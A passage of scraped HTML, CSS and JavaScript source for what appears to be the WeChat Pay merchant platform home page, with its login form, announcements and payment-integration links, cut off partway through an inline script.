.wrap-login{position:relative;z-index:2;}             .banner .login{float:right;width:314px;margin-top:20px;padding:15px 15px 20px;background:rgba(255,255,255,0.8);position:static;border:1px solid #fff;}              @media \\0screen\\,screen\\9{                 .banner .login{background:#fff;filter:alpha(opacity=80);*zoom:1;position:static;}                 .banner .login .login-in{position:relative;}             }             .banner .login h2{margin-bottom:5px;font-size:20px;font-weight:400;}             .banner .login h2 strong{display:none;}             .banner .login a{color:#333}             .banner .login a:hover{color:#459ae9}             .banner .login .tips-error a,.banner .login .tips-warn a{color:#459ae9}             .banner .login .tips-error{line-height:24px;font-size:13px;}             .banner .login .tips-warn .warn{float:left;width:16px;height:16px;background-position:-24px 0;margin-top:4px;}             .banner .login .tips-warn p{float:right;color:#b29b4a;width:290px;font-size:13px;line-height:24px}             .banner .login-form .login-mainly{margin-top:10px;margin-bottom:10px;}             .banner .login-form .login-account,.banner .login-form .login-password{height:42px;line-height:42px;padding:3px 0;background:#fff;border-left:1px solid #cecece;border-top:1px solid #cecece;position:relative;padding-left:54px;}             .banner .login-form label{width:20px;height:20px;overflow:hidden;text-indent:-999px;position:absolute;left:20px;top:30%}             .banner .login-form input{width:100%;padding:11px 0;border:0;box-shadow:0;outline:0;vertical-align:middle;font-family:""Microsoft YaHei"";font-size:14px;}             .banner .login-form .ico-account{background-position:0 0;}             .banner .login-form .ico-password{background-position:0 -26px;}             .banner .login-form .login-password{margin-top:10px;}             .banner .login-password-on .login-account{border-bottom:none;}             .banner .login-verify{margin-bottom:10px;height:38px;}             .banner .login-verify input{width:100px;padding:10px;vertical-align:middle;vertical-align:middle;border-left:1px solid #cecece;border-top:1px solid #cecece;}             .banner .login-verify input:focus{border-left:1px solid #cecece;border-top:1px solid #cecece;}             .banner .login-verify .img-verify{width:100px;height:40px;margin:0 11px;vertical-align:middle;}             .banner .login-memory{margin-bottom:20px;overflow:hidden;zoom:1;}             .banner .login-memory .memory-account{float:left;}             .banner .login-memory .forget-password{float:right;}             .banner .login .btn-login{display:inline-block;width:100%;height:45px;line-height:45px;background-color:#00c800;color:#fff;border:1px solid #44b549;text-align:center;font-size:20px;}             .banner .login .btn-login:hover{text-decoration:none;background:#2F9833;color:#fff;}              .guide-main-li-ico{display:inline-block;width:73px;height:57px;}             .ico-mp{background-position:2px -159px;}             .ico-app{background-position:8px -366px;}             .ico-code{background-position:4px -230px;}             .ico-shuaka{background-position:8px -294px;}              /*ÊúÄÊñ∞ÂÖ¨Âëä*/             .cms-notice{margin:5px 0 -7px;position:relative;}             .cms-notice h2,.cms-notice ul,.cms-notice p{display:inline-block;line-height:20px;}             .cms-notice h2{float:left;background:#595B5B;color:#fff;font-size:14px;padding:0px 4px;}             .cms-notice li{float:left;margin-left:18px;width:275px;}             .cms-notice a{color:#222}             .cms-notice a:hover{color:#459ae9}             .cms-notice li span.time{float:left;color:#999;margin-right:5px;}             .cms-notice li a{display:inline-block;max-width:205px;_width:205px;height:21px;white-space:nowrap;overflow-x:hidden;text-overflow:ellipsis;}             .cms-notice p{float:right;}             .cms-notice p a{color:#222;}             .cms-notice li .ico-new{position:absolute;display:inline-block;width:17px;height:9px;margin-left:5px;background:url(https://wx.gtimg.com/mch/img/ico-new.png);}             .cms-notice .more{position:absolute;top:0;right:0;}             .cms-notice .more .ico-right{display:inline-block;width:11px;height:9px;margin:0 0 0 3px;vertical-align:middle;background-position:-4px -135px;}              /*ÂõõÂ§ßÊîØ‰ªòÊñπÂºè*/             .title{margin-top:45px;}             .title h2,.title .line,.title .pay-btn{display:inline-block;}             .title h2{font-size:20px;font-weight:normal;color:#333;background:#fff;position:absolute;margin-top:-15px;padding-right:10px;}             .title .pay-btn{position:absolute;right:0;margin-top:-14px;background:#fff;padding-left:5px;}             .title .pay-btn a{display:block;border:1px solid #3e3a39;padding:2px 5px 2px 17px;color:#333333;}             .title .pay-btn a:hover{text-decoration:none}             .through{height:326px;margin-top:20px;padding-bottom:35px;border-bottom:1px dotted #ccc;background:url(https://wx.gtimg.com/pay/img/home/qrcode.png?v=20150602) center top no-repeat;}             .through li{font-size:16px;margin-top:58px;margin-left:68px;position:absolute;}             .through li.l02{margin-top:143px;}             .through li.l03{margin-top:228px;}             .through li.l04{margin-left:748px;}             .through li.l05{margin-top:143px;margin-left:755px;}             .through li.l06{margin-top:228px;margin-left:755px;}              .guide-main{margin-top:37px;margin-bottom:5px;}             .guide-main li{width:240px;height:266px;background-color:#FFFFFF;float:left;margin-right:21px;_margin-right:20px;text-align:center}             .guide-main .guide-main-li-4{margin-right:0;}             .guide-main li a{width:239px;height:266px;display:block;position:relative;border:1px solid #e5e5e5;}             .guide-main li .title{display:block;color:#000000;font-size:16px;line-height:1;margin-top:25px;font-weight:normal}             .guide-main li .info{display:block;color:#999999;font-size:12px;line-height:1;margin-top:14px;}             .guide-main li .info .strong{font-weight:bold;}             .guide-main-li-ico{margin-top:72px;-webkit-transition:margin-top 0.2s linear;-moz-transition:margin-top 0.2s linear;-ms-transition:margin-top 0.2s linear;-o-transition:margin-top 0.2s linear;transition:margin-top 0.2s linear;}             .guide-main li .btngreen{display:none;margin:20px auto 0;width:191px;height:35px;line-height:35px;background-color:#00C800;font-size:14px;color:#FFFFFF;border-bottom:1px solid #00A000;}             .guide-main li .btngray{background-color:#E6E6E6!important;color:#666666!important;border-bottom:1px solid #CCCCCC;}             .guide-main-li-3 .tips{display:none;font-size:12px;color:#FF9900;line-height:1;}             .guide-main-li-3 .tips .ico-info-orange{vertical-align:-3px;*vertical-align:1px;margin-right:5px;margin-top:12px;}             .guide-main li a:hover{border:1px solid #00c800;text-decoration:none}             .guide-main li a:hover .btngreen{display:block;}             .guide-main li a:hover .tips{display:block;}             .guide-main li a:hover .guide-main-li-ico{margin-top:45px;-webkit-transition:margin-top 0.2s linear;-moz-transition:margin-top 0.2s linear;-ms-transition:margin-top 0.2s linear;-o-transition:margin-top 0.2s linear;transition:margin-top 0.2s linear;}             .guide-link{padding-top:120px;padding-bottom:58px;position:relative;height:24px;}             .guide-link-a{color:#00C800;font-size:18px;height:24px;width:162px;}             .guide-link-a .ico-arrow-right{vertical-align:-2px;*vertical-align:3px;margin-left:8px;cursor:pointer;}             .guide-link-code{display:none;position:absolute;border:1px solid #C9C9C9;padding:6px;background-color:#FFFFFF;width:105px;height:105px;top:67px;left:50%;margin-left:90px;}             .show-code .guide-link-code{display:block;}             .show-code .ico-arrow-right{-webkit-transform:scale(-1, 1);-moz-transform:scale(-1, 1);-ms-transform:scale(-1, 1);-o-transform:scale(-1, 1);transform:scale(-1, 1);}              /*ÂõæÁâáËΩÆÊí≠*/             .cms-banner{position:absolute;top:0;width:100%;height:410px;overflow:hidden; left:0}             .cms-banner a{display:block;width:100%;height:410px;text-indent:-9999px;}             .cms-banner ul li{position:absolute;top:0;width:100%;height:410px;background-position:center;background-repeat:no-repeat;}             .cms-banner ol{position:absolute;z-index:9;bottom:0px;display:table;left:50%;margin-left:-73px;padding:16px 16px 16px 0;}             .cms-banner ol li{float:left;width:10px;height:10px;margin-left:16px;text-indent:-9999px;background:#fff;border-radius:5px;overflow:hidden;}             .cms-banner ol li.active{background:#44B549;}         </style>     </head> <body class=""index"" onclick=""pgvWatchClick();"">  <!-- Â§¥ÈÉ®[[ --> <!-- Â§¥ÈÉ® [[ --> <script>var _speedMark=Date.now()</script> <!--Â∞è‰∫éie7 Ë∑≥ËΩ¨Âà∞ÈîôËØØÈ°µÈù¢ --> <!--[if lt IE 7]> <script>     window.location.href=\'https://pay.weixin.qq.com/public/error/browser_tips\'; </script> <![endif]--> <div class=""topbar"">     <div class=""wrap"">         <span onclick=""pgvSendClick({hottag:\'PAY.HOME.NAVI.CHINA_BUSINESS\);"">Â¢ÉÂÜÖ‰∏öÂä°</span>         <i class=""vs"">|</i>         <a onclick=""pgvSendClick({hottag:\'PAY.HOME.NAVI.INTERNATIONAL_BUSINESS\);"" href=""https://pay.weixin.qq.com/index.php/public/wechatpay"" target=""_blank"">International business</a>     </div> </div> <div class=""header"">     <div class=""wrap"">         <div class=""logo""><h1><a href=""/index.php/core/account"" title=""ÂæÆ‰ø°ÊîØ‰ªòÂïÜÊà∑Âπ≥Âè∞"">ÂæÆ‰ø°ÊîØ‰ªòÂïÜÊà∑Âπ≥Âè∞</a></h1></div>         <div class=""link"">             <a href=""https://pay.weixin.qq.com/partner/public/home"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.NAVI.SERVICE_PROVIDER\);""><strong class=""hide"">ÂæÆ‰ø°ÊîØ‰ªò</strong>ÊúçÂä°ÂïÜ</a>             <i class=""vs"">|</i>             <a href=""https://pay.weixin.qq.com/wxzf_guide/index.shtml"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.NAVI.WXZF_GUIDE\);""><strong class=""hide"">ÂæÆ‰ø°ÊîØ‰ªò</strong>Êé•ÂÖ•ÊåáÂºï</a>             <i class=""vs"">|</i>             <a href=""https://pay.weixin.qq.com/wiki/doc/api/index.php"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.NAVI.API_DOC\);""><strong class=""hide"">ÂæÆ‰ø°ÊîØ‰ªò</strong>ÂºÄÂèëÊñáÊ°£</a>             <i class=""vs"">|</i>             <div class=""pole-msg showPopUpJS"">                 <a class=""content-us"" href=""javascript:;"" onclick=""pgvSendClick({hottag:\'PAY.HOME.NAVI.HELP_CENTER\);"">Â∏ÆÂä©‰∏≠ÂøÉ<span class=""dropdown-arrow""></span></a>                 <div class=""popup"">                     <div class=""inner"">                         <ul>                             <li>                                 <p class=""tel"">ÂÆ¢ÊúçÔºö95017</p>                                 <p>Âë®‰∏ÄÂà∞Âë®‰∫î 09:00-18:00</p>                             </li>                             <li class=""bor-top"">                                 <a href=""http://kf.qq.com/product/wechatpaymentmerchant.html"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.NAVI.QQ_KEFU\);"">Ëá™Âä©ÊúçÂä°‰∏ìÂå∫</a>                             </li>                         </ul>                     </div>                 </div>             </div>         </div>     </div> </div>  <script src=""https://wx.gtimg.com/third/jquery/jquery-1.7.min.js""></script> <script type=""text/javascript"">if(typeof $jqueryUi == ""undefined""){document.write(\'<script type=""text/javascript"" src=""https://wx.gtimg.com/third/jquery/jquery-ui.js""></script""+"">\');}</script><script type=""text/javascript"" src=""https://wx.gtimg.com/third/jquery/jquery-ui.js""></script""+""> <script>window[""MCH.common.time""]=[new Date()]</script> <script id=""legos:22195"" ver=""22195:20140901:20160908155731"" name=""MCH.common"" src=""https://wx.gtimg.com/mch/js/ver/2014/09/mch.common.20140901.js?t=20160908155731"" charset=""utf-8""></script><div class=""mask-layer hide"" id=""header-masker""></div><!--[if !IE]>|xGv00|c95d265e97fcc54b235954b5b4a712f5<![endif]--> <script>window[""MCH.header.time""]=[new Date()]</script> <script id=""legos:22118"" ver=""22118:20140422:20160620111341"" name=""MCH.header"" src=""https://wx.gtimg.com/mch/js/ver/2014/04/mch.header.20140422.js?t=20160620111341"" charset=""utf-8""></script><!--[if !IE]>|xGv00|da289bab2d090281ed2476547ba6b944<![endif]--> <!-- Â§¥ÈÉ® ]] --><!--[if !IE]>|xGv00|73bbdddabec4f094fcae10c51db0f883<![endif]--> <!-- Â§¥ÈÉ® ]] -->  <!-- ÁôªÂΩï[[ --> <div class=""banner"">      <div class=""cms-banner cms-area"" id=""cmspic_1000"" home=""true""><ul><li style=""opacity: 0; z-index: 0; background-image: url(&quot;https://shp.qpic.cn/mmpay/oU5xbewRJutFViafoibhr5UHrDC2mbMGDZyLEY3icMbqS2o3BoicgX18HtuYicRR0fOJM/0&quot;);""><a target=""_blank"" href=""https://pay.weixin.qq.com/public/qrcode_pay"">banner</a></li><li style=""opacity: 0.248188; z-index: 0; background-image: url(&quot;https://shp.qpic.cn/mmpay/oU5xbewRJuvfQibNQiaWz5VUDocbQSYYe3hM60YBT0t6AWkzDjcIFFgQxckUUn64nQ/0&quot;);""><a target=""_blank"" href=""http://v.qq.com/x/cover/mv3e2ecbtloy44o.html?vid=u01960zjo7r"">banner</a></li><li style=""opacity: 0.751812; z-index: 1; background-image: url(&quot;https://shp.qpic.cn/mmpay/oU5xbewRJuv0wHAj5rxw34SXVgoycsicBB7zpopLBoGzl6S7EicZPsOPsyfj90NG2I/0&quot;);""><a target=""_blank"" href=""http://v.qq.com/x/cover/mv3e2ecbtloy44o.html?vid=u01960zjo7r"">banner</a></li><li style=""opacity: 0; z-index: 0; background-image: url(&quot;https://shp.qpic.cn/mmpay/oU5xbewRJuupH9MJ5hbqw5sMmlyyn0UnUicF2UeHLKEkCO11MnS1DoXXicX3gOwfuK/0&quot;);""><a target=""_blank"" href=""http://v.qq.com/x/cover/mv3e2ecbtloy44o.html?vid=u01960zjo7r"">banner</a></li><li style=""opacity: 0; z-index: 0; background-image: url(&quot;https://shp.qpic.cn/mmpay/oU5xbewRJuuZ81jvVm2RMN2C3hBE2oKW6UjJKs99mAZRxGOdCFYkyMU8NxHLDlLQ/0&quot;);""><a target=""_blank"" href=""http://v.qq.com/x/cover/mv3e2ecbtloy44o.html?vid=u01960zjo7r"">banner</a></li></ul><ol class=""dots"" style=""opacity: 1; z-index: 1;""><li class=""dot"">1</li><li class=""dot"">2</li><li class=""dot active"">3</li><li class=""dot"">4</li><li class=""dot"">5</li></ol></div>     <div class=""wrap"">         <div class=""wrap-login"">             <div class=""login"">                 <div class=""login-in"">                     <h2><span class=""hide"">ÂæÆ‰ø°ÊîØ‰ªò</span>ÂïÜÊà∑ÁôªÂΩï</h2>                     <div class=""tips-warn clr hide"" id=""IDBrowserSafariTips""><i class=""warn""></i><p>Áî±‰∫éSafariÊµèËßàÂô®ÂÆâÂÖ®Á≠ñÁï•ÔºåÂ¶ÇÂØÜÁ†ÅËæìÂÖ•Âá∫Áé∞ÂºÇÂ∏∏ÔºåËØ∑Ê†πÊçÆÊåáÂºï‰øÆÊîπSafariÊµèËßàÂô®ÈÖçÁΩÆÔºå                         <a href=""/help_guide/login_guide.shtml"" target=""_blank"">Êü•ÁúãÊåáÂºï</a></p></div>                     <div class=""tips-warn clr hide"" id=""IDBrowserMacChromeTips""><i class=""warn""></i><p>                         Â¶ÇÂØÜÁ†ÅËæìÂÖ•Âá∫Áé∞ÂºÇÂ∏∏ÔºåËØ∑Ê†πÊçÆÊåáÂºï‰øÆÊîπÊµèËßàÂô®ÈÖçÁΩÆÔºå                         <a href=""https://pay.weixin.qq.com/index.php/public/cms/content_detail?platformType=0&amp;lang=zh&amp;id=29000 "" target=""_blank"">Êü•ÁúãÊåáÂºï„ÄÇ</a></p></div>                       <div class=""tips-error""><i class=""ico-error""></i><p id=""errmsg"" style=""color:red""></p></div>                      <!-- ‰∫§‰∫íËØ¥Êòé                          1. ÁªôÊ†∑Âºè""login-form""Ê∑ªÂä†Ê†∑Âºè""login-account-on"",ÊòæÁ§∫Ë¥¶Âè∑Ëé∑ÁÑ¶ÊïàÊûú                          2. ÁªôÊ†∑Âºè""login-form""Ê∑ªÂä†Ê†∑Âºè""login-password-on"",ÊòæÁ§∫ÂØÜÁ†ÅËé∑ÁÑ¶ÊïàÊûú                     -->                     <form class=""login-form login-password-on"" action=""/index.php/core/home/d_login_transition"" method=""post"">                         <div class=""login-mainly"">                             <div class=""login-account""><label class=""ico-account"" for="""" title=""ÁôªÂΩïÂ∏êÂè∑"">ÁôªÂΩïÂ∏êÂè∑</label><input type=""text"" name=""username"" placeholder=""ÁôªÂΩïÂ∏êÂè∑"" id=""idUserName""></div>                             <div class=""login-password"" id=""mmpayPwdEdit""><label class=""ico-password"" for="""" title=""ÁôªÂΩïÂØÜÁ†Å"">ÁôªÂΩïÂØÜÁ†Å</label><input type=""password"" name=""password"" placeholder=""ÁôªÂΩïÂØÜÁ†Å"" id=""idPassword""></div>                         </div>                          <input type=""hidden"" name=""return_url"" value=""/index.php"">                         <input type=""hidden"" name=""login_type"" value=""0"">                         <input id=""token"" type=""hidden"" name=""ecc_csrf_token"" value=""2a9b085516b87f66cb0ca18a5453bdf4"">                          <div class=""login-verify ""><input type=""text"" name=""checkword_in"" maxlength=""4"" placeholder=""È™åËØÅÁ†Å""><input type=""hidden"" name=""need_check"" value=""1""><img class=""img-verify change-verify"" src=""http://captcha.qq.com/getimage?aid=755049101&amp;rd=0.1314846018794924"" style=""height:40px;width:100px;""><a class=""change-verify"" href=""#"">Êç¢‰∏ÄÂº†</a></div>                     </form>                     <div class=""login-memory""><label id=""memory_username_label"" class=""memory-account"" for=""""><i class=""cbx"" id=""memory_username""></i>ËÆ∞‰ΩèÂ∏êÂè∑</label><a class=""forget-password"" href=""/index.php/public/reset_pass"" onclick=""pgvSendClick({hottag:\'PAY.HOME.LOGIN_BOX.FORGET_PASSWORD\);"">ÂøòËÆ∞ÂØÜÁ†ÅÔºü</a></div>                     <a class=""btn-login"" href=""javascript:void(0);"" id=""do_login"" onclick=""pgvSendClick({hottag:\'PAY.HOME.LOGIN_BOX.LOGIN_BUTTON\);"">ÁôªÂΩï</a>                 </div>             </div>             <input id=""seed"" type=""hidden"" name=""time_seed"" value=""31343839353931393137"">         </div>     </div>  </div> <!-- ÁôªÂΩï ]] -->  <!-- ÂÜÖÂÆπ[[ --> <div class=""container"">     <div class=""wrap"">         <!-- ÊúÄÊñ∞ÂÖ¨Âëä[[ -->         <div class=""cms-notice cms-area clr"" id=""cmsanm_6000"" home=""true"" link-list-id=""6200""><h2>ÊúÄÊñ∞ÂÖ¨Âëä</h2><ul><li><span class=""time"">[03.15]</span><a target=""_blank"" href=""/index.php/public/cms/content_detail?lang=zh&amp;id=36602"" title=""3Êúà16-17Êó•ÂæÆ‰ø°ÊîØ‰ªòÈÄÄÊ¨æ‰∏öÂä°ÂçáÁ∫ßÁª¥Êä§ÈÄöÁü•"">3Êúà16-17Êó•ÂæÆ‰ø°ÊîØ‰ªòÈÄÄÊ¨æ‰∏öÂä°ÂçáÁ∫ßÁª¥Êä§ÈÄöÁü•</a><i class=""ico-new""></i></li><li><span class=""time"">[02.10]</span><a target=""_blank"" href=""/index.php/public/cms/content_detail?lang=zh&amp;id=41201"" title=""ÂæÆ‰ø°ÊîØ‰ªò‰ºÅ‰∏ö‰ªòÊ¨æ‰∏öÂä°Ë∞ÉÊï¥ÂÖ¨Âëä"">ÂæÆ‰ø°ÊîØ‰ªò‰ºÅ‰∏ö‰ªòÊ¨æ‰∏öÂä°Ë∞ÉÊï¥ÂÖ¨Âëä</a></li><li><span class=""time"">[11.30]</span><a target=""_blank"" href=""/index.php/public/cms/content_detail?lang=zh&amp;id=30001"" title=""„ÄäÂïÜÊà∑Âπ≥Âè∞‰ΩøÁî®ÊâãÂÜå„ÄãÊ≠£Âºè‰∏äÁ∫ø"">„ÄäÂïÜÊà∑Âπ≥Âè∞‰ΩøÁî®ÊâãÂÜå„ÄãÊ≠£Âºè‰∏äÁ∫ø</a></li></ul><p class=""more""><a href=""/public/cms/content_list?lang=zh&amp;id=6200"" target=""_blank"">Êõ¥Â§öÂÖ¨Âëä&gt;&gt;</a></p></div>         <!-- ÊúÄÊñ∞ÂÖ¨Âëä ]] -->          <!-- ÂõõÂ§ßÊîØ‰ªòÊñπÂºè[[ -->         <div class=""title clr"">             <h2>Êé•ÂÖ•ÂæÆ‰ø°ÊîØ‰ªò</h2>         </div>         <div class=""function clr"">             <ul class=""guide-main clr"">                 <li class=""guide-main-li-1"">                     <a href=""http://kf.qq.com/faq/120911VrYVrA150905zeYjMZ.html"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.APPLY.IN_APP_WEB\);"">                         <span class=""guide-main-li-ico ico-mp""></span>                         <h3 class=""title"">ÂÖ¨‰ºóÂè∑ÊîØ‰ªò</h3>                         <p class=""info"">Âú®ÂæÆ‰ø°ÂÜÖÁöÑÂïÜÂÆ∂È°µÈù¢‰∏äÂÆåÊàê<em>ÂÖ¨‰ºóÂè∑ÊîØ‰ªò</em></p>                         <span class=""btngreen"">ÊàëË¶ÅÊé•ÂÖ•</span>                     </a>                 </li>                 <li class=""guide-main-li-2"">                     <a href=""http://kf.qq.com/faq/120911VrYVrA150906F3qqY3.html"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.APPLY.IN_APP\);"">                         <span class=""guide-main-li-ico ico-app""></span>                         <h3 class=""title"">APPÊîØ‰ªò</h3>                         <p class=""info"">Âú®APP‰∏≠ÔºåË∞ÉËµ∑ÂæÆ‰ø°ËøõË°å<em>APPÊîØ‰ªò</em></p>                         <span class=""btngreen"">ÊàëË¶ÅÊé•ÂÖ•</span>                     </a>                 </li>                 <li class=""guide-main-li-3"">                     <a href=""http://kf.qq.com/faq/120911VrYVrA150906yUZze6.html"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.APPLY.QR_CODE\);"">                         <span class=""guide-main-li-ico ico-code""></span>                         <h3 class=""title"">Êâ´Á†ÅÊîØ‰ªò</h3>                         <p class=""info"">Êâ´Êèè‰∫åÁª¥Á†ÅËøõË°å<em>Êâ´Á†ÅÊîØ‰ªò</em></p>                         <span class=""btngreen"">ÊàëË¶ÅÊé•ÂÖ•</span>                     </a>                 </li>                 <li class=""guide-main-li-4"">                     <a href=""http://kf.qq.com/faq/120911VrYVrA150906iQjQjI.html"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.APPLY.QUICK_PAY\);"">                         <span class=""guide-main-li-ico ico-shuaka""></span>                         <h3 class=""title"">Âà∑Âç°ÊîØ‰ªò</h3>                         <p class=""info"">Áî®Êà∑Â±ïÁ§∫Êù°Á†ÅÔºåÂïÜÊà∑Êâ´ÊèèÂÆåÊàê<em>Âà∑Âç°ÊîØ‰ªò</em></p>                         <span class=""btngreen"">ÊàëË¶ÅÊé•ÂÖ•</span>                     </a>                 </li>             </ul>         </div>         <!-- ÂõõÂ§ßÊîØ‰ªòÊñπÂºè ]] -->          <!-- ÂæÆ‰ø°ÊîØ‰ªòÂïÜÊà∑ÈÄö[[ -->         <div class=""title clr"">             <h2>ÂæÆ‰ø°ÊîØ‰ªòÂïÜÊà∑ÈÄö</h2>         </div>         <div class=""through"">             <ul>                 <li class=""l01"">Â¶Ç‰ΩïÂø´ÈÄüÊé•ÂÖ•<strong>ÂæÆ‰ø°ÊîØ‰ªò</strong>Ôºü</li>                 <li class=""l02"">‰∫ÜËß£ÊúÄÊñ∞ÁöÑ<strong>ÊîØ‰ªòÊäÄÊúØÊé•Âè£</strong>Ôºü</li>                 <li class=""l03""><strong>ÂæÆ‰ø°ÂïÜÊà∑</strong>ÂêéÂè∞Êìç‰ΩúÊúâÁñëÈóÆÔºü</li>                 <li class=""l04""><strong>ÂæÆ‰ø°Áé∞ÈáëÁ∫¢ÂåÖ</strong>ÊÄé‰πàÁé©Ôºü</li>                 <li class=""l05"">ÊéåÊè°ÊúÄÊñ∞ÁöÑ<strong>ÂæÆ‰ø°Ë°å‰∏öËß£ÂÜ≥ÊñπÊ°à</strong>Ôºü</li>                 <li class=""l06"">Ëé∑Âèñ‰∏ÄÊâãÁöÑ<strong>ÂæÆ‰ø°ÊîØ‰ªòÂÆòÊñπÂä®ÊÄÅ</strong>Ôºü</li>             </ul>         </div>         <!-- ÂæÆ‰ø°ÊîØ‰ªòÂïÜÊà∑ÈÄö ]] -->     </div> </div> <!-- ÂÜÖÂÆπ ]] -->  <script src=""https://www.tenpay.com/v2/res/js/global/tenpayctrl_v2-min.js""></script> <script>window[""MCH.tenpaycertV2.time""]=[new Date()]</script> <script id=""legos:22410"" ver=""22410:20151023:20170106102318"" name=""MCH.tenpaycertV2"" src=""https://wx.gtimg.com/mch/js/ver/2015/10/mch.tenpaycertV2.20151023.js?t=20170106102318"" charset=""utf-8""></script><!--[if !IE]>|xGv00|09219d01d9d2312179afd1ffbb55230b<![endif]--><!--[if !IE]>|xGv00|8ab59df4495293a71573934cfa4d640c<![endif]--> <script>window[""MCH.home.time""]=[new Date()]</script> <script id=""legos:22134"" ver=""22134:20140516:20170105201629"" name=""MCH.home"" charset=""utf-8"">     window[\'MCH.home.time\'] && window[\'MCH.home.time\'].push(new Date());     function $addToken(url,type,skey){var token=$getToken(skey);if(url==""""||(url.indexOf(""://"")<0?location.href:url).indexOf(""http"")!=0){return url;}         if(url.indexOf(""#"")!=-1){var f1=url.match(/\\?.+\\#/);if(f1){var t=f1[0].split(""#""),newPara=[t[0],""&g_tk="",token,""&g_ty="",type,""#"",t[1]].join("""");return url.replace(f1[0],newPara);}else{var t=url.split(""#"");return[t[0],""?g_tk="",token,""&g_ty="",type,""#"",t[1]].join("""");}}         return token==""""?(url+(url.indexOf(""?"")!=-1?""&"":""?"")+""g_ty=""+type):(url+(url.indexOf(""?"")!=-1?""&"":""?"")+""g_tk=""+token+""&g_ty=""+type);};var $ajax=(function(window,undefined){var oXHRCallbacks,xhrCounter=0;var fXHRAbortOnUnload=window.ActiveXObject?function(){for(var key in oXHRCallbacks){oXHRCallbacks[key](0,1);}}:false;return function(opt){var o={url:\'\',method:\'GET\',data:null,type:""text"",async:true,cache:false,timeout:0,autoToken:true,username:\'\',password:\'\',beforeSend:$empty(),onSuccess:$empty(),onError:$empty(),onComplete:$empty()};for(var key in opt){o[key]=opt[key]}         var callback,timeoutTimer,xhrCallbackHandle,ajaxLocation,ajaxLocParts;try{ajaxLocation=location.href;}         catch(e){ajaxLocation=document.createElement(""a"");ajaxLocation.href="""";ajaxLocation=ajaxLocation.href;}         ajaxLocParts=/^([\\w\\+\\.\\-]+:)(?:\\/\\/([^\\/?#:]*)(?::(\\d+)|)|)/.exec(ajaxLocation.toLowerCase())||[];o.isLocal=/^(?:about|app|app\\-storage|.+\\-extension|file|res|widget):$/.test(ajaxLocParts[1]);o.method=(typeof(o.method)!=""string""||o.method.toUpperCase()!=""POST"")?""GET"":""POST"";o.data=(typeof o.data==""string"")?o.data:$makeUrl(o.data);if(o.method==\'GET\'&&o.data){o.url+=(o.url.indexOf(""?"")<0?""?"":""&"")+o.data;}         if(o.autoToken){o.url=$addToken(o.url,""ajax"");}         o.xhr=$xhrMaker();if(o.xhr===null){return false;}         try{if(o.username){o.xhr.open(o.method,o.url,o.async,o.username,o.password);}         else{o.xhr.open(o.method,o.url,o.async);}}         catch(e){o.onError(-2,e);return false;}         if(o.method==\'POST\'){o.xhr.setRequestHeader(\'Content-Type\',\'application/x-www-form-urlencoded\');}         if(!o.cache){o.xhr.setRequestHeader(\'If-Modified-Since\',\'Thu, 1 Jan 1970 00:00:00 GMT\');o.xhr.setRequestHeader(\'Cache-Control\',\'no-cache\');}         o.beforeSend(o.xhr);if(o.async&&o.timeout>0){if(o.xhr.timeout===undefined){timeoutTimer=setTimeout(function(){if(o.xhr&&callback){callback(0,1);}             o.onError(0,null,\'timeout\');},o.timeout);}         else{o.xhr.timeout=o.timeout;o.xhr.ontimeout=function(){if(o.xhr&&callback){callback(0,1);}             o.onError(0,null,\'timeout\');};}}         o.xhr.send(o.method==\'POST\'?o.data:null);callback=function(e,isAbort){if(timeoutTimer){clearTimeout(timeoutTimer);timeoutTimer=undefined;}             if(callback&&(isAbort||o.xhr.readyState===4)){callback=undefined;if(xhrCallbackHandle){o.xhr.onreadystatechange=$empty();if(fXHRAbortOnUnload){try{delete oXHRCallbacks[xhrCallbackHandle];}             catch(e){}}}                 if(isAbort){if(o.xhr.readyState!==4){o.xhr.abort();}}                 else{var status,statusText,responses;responses={headers:o.xhr.getAllResponseHeaders()};status=o.xhr.status;try{statusText=o.xhr.statusText;}                 catch(e){statusText="""";}                     try{responses.text=o.xhr.responseText;}                     catch(e){responses.text="""";}                     if(!status&&o.isLocal){status=responses.text?200:404;}                     else if(status===1223){status=204;}                     if(status>=200&&status<300){responses.text=responses.text.replace(/<!--\\[if !IE\\]>[\\w\\|]+<!\\[endif\\]-->/g,\'\');switch(o.type){case\'text\':o.onSuccess(responses.text);break;case""json"":var json;try{json=(new Function(""return (""+responses.text+"")""))();}                     catch(e){o.onError(status,e,responses.text);}                         if(json){o.onSuccess(json);}                         break;case""xml"":o.onSuccess(o.xhr.responseXML);break;}}                     else{if(status===0&&o.timeout>0){o.onError(status,null,\'timeout\');}                     else{o.onError(status,null,statusText);}}                     o.onComplete(status,statusText,responses);}                 delete o.xhr;}};if(!o.async){callback();}         else if(o.xhr.readyState===4){setTimeout(callback,0);}         else{xhrCallbackHandle=++xhrCounter;if(fXHRAbortOnUnload){if(!oXHRCallbacks){oXHRCallbacks={};if(window.attachEvent){window.attachEvent(""onunload"",fXHRAbortOnUnload);}         else{window[""onunload""]=fXHRAbortOnUnload;}}             oXHRCallbacks[xhrCallbackHandle]=callback;}             o.xhr.onreadystatechange=callback;}};})(window,undefined);function $empty(){return function(){return true;}};function $getCookie(name){var reg=new RegExp(""(^| )""+name+""(?:=([^;]*))?(;|$)""),val=document.cookie.match(reg);return val?(val[2]?unescape(val[2]):""""):null;};function $getToken(skey){var skey=skey?skey:$getCookie(""skey"");return skey?$time33(skey):"""";};function $makeUrl(data){var arr=[];for(var k in data){arr.push(k+""=""+data[k]);};return arr.join(""&"");};function $namespace(name){for(var arr=name.split(\',\'),r=0,len=arr.length;r<len;r++){for(var i=0,k,name=arr[r].split(\'.\'),parent={};k=name[i];i++){i===0?eval(\'(typeof \'+k+\')===""undefined""?(\'+k+\'={}):"""";parent=\'+k):(parent=parent[k]=parent[k]||{});}}};function $setCookie(name,value,expires,path,domain,secure){var exp=new 